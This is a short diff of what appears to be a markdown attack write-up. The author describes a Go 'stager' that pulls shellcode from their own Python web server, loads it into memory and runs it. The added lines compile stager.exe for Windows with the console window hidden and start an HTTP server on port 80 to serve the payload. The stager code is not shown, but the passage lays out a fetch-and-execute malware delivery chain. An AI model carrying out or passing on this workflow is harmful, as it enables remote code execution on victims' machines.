@@ -1180,6 +1180,16 @@ func main() {
 Ill use this go code as the stager and call this stager.go, it will reach out to my python web server and grab the shellcode then load it into memory and execute it
 
 ```python
-
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o stager.exe stager.go
 ```
+
+This has compiled the code into stager.exe
+
+```python
+python3 -m http.server 80
+```
+
+Then ill set up the web server
+
+
 
